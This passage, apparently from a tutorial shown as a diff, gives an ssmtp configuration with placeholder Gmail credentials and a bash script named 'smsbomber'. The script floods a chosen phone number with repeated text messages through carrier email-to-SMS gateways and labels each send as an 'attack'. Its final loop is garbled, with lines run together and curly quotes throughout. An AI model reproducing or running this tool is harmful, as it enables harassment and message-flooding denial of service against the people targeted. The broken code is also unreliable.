@@ -1,0 +1,128 @@
+AuthUser=YOURUSERNAME@gmail.com
+AuthPass=YOURPASSWORD
+UseSTARTTLS=YES
+Then, you’ll need to save the following code as whatever you want (I call it smsbomber):
+
+#! /bin/bash
+COUNTER=0
+SPEED=2
+function usage {
+echo “USAGE: $0 [OPTIONS] … [ARGUMENTS]”
+echo
+echo “-p Phone Number”
+echo “-c Carrier Code”
+echo “-o Display Carrier Codes”
+echo “-m Message to Send”
+echo “-t Number of Times to Send Message”
+echo “-d Delay (in seconds) Between Messages”
+echo “-h This Help Screen”
+echo
+echo “You can check the carrier of a phone number”
+echo “at www.fonefinder.net”
+echo
+echo “Instead of using a preset carrier code, you”
+echo “can enter the SMS gateway of the carrier”
+echo “using the ‘-c’ option.”
+echo
+echo “Written by MrPockets (aka GhostNode) and disk0”
+exit
+}
+
+function carriers {
+echo “Carrier Codes:”
+echo
+echo “1 AT&T”
+echo “2 Boost Mobile”
+echo “3 Cingular”
+echo “4 Nextel”
+echo “5 Sprint”
+echo “6 Verizon or Straigh Talk”
+echo “7 T-mobile”
+echo “8 TracFone”
+echo “9 US Cellular”
+echo “10 Virgin Mobile”
+exit
+}
+
+if [ “$1” == “” ]; then
+usage
+fi
+while [ “$1” != “” ]; do
+case “$1” in
+
+‘-p’)
+shift
+NUMBER=$1
+;;
+‘-c’)
+shift
+case “$1” in
+‘1’)
+GATEWAY=”@txt.att.net”
+;;
+‘2’)
+GATEWAY=”@myboostmobile.com”
+;;
+‘3’)
+GATEWAY=”@cingular.com”
+;;
+‘4’)
+GATEWAY=”@messaging.nextel.com”
+;;
+‘5’)
+GATEWAY=”@messaging.sprintpcs.com”
+;;
+‘6’)
+GATEWAY=”@vtext.com”
+;;
+‘7’)
+GATEWAY=”@tmomail.net”
+;;
+‘8’)
+GATEWAY=”@mmst5.tracfone.com”
+;;
+‘9’)
+GATEWAY=”@email.uscc.net”
+;;
+’10’)
+GATEWAY=”@yrmobl.com”
+;;
+*)
+GATEWAY=$1
+;;
+esac
+;;
+‘-m’)
+shift
+MESSAGE=$1
+;;
+‘-d’)
+shift
+SPEED=$1
+;;
+‘-t’)
+shift
+TIMES=$1
+;;
+‘-h’)
+usage
+;;
+‘-o’)
+carriers
+;;
+*)
+usage
+;;
+esac
+shift
+done
+
+echo >> delivery
+echo >> delivery
+echo $MESSAGE >> delivery
+clear
+echo ” Attacking Device at: $NUMBER “
+echo ” With Message: $MESSAGE “
+
+until [ $TIMES -le $COUNTER ]; do
+ssmtp $NUMBER$GATEWAY < delivery sleep $SPEED COUNTER=$(($COUNTER +1)) echo ================================== echo echo “Attack $COUNTER of $TIMES” echo echo Message: $MESSAGE date echo “Ctrl+C to call off attack” echo ================================== done rm 1.txt rm delivery
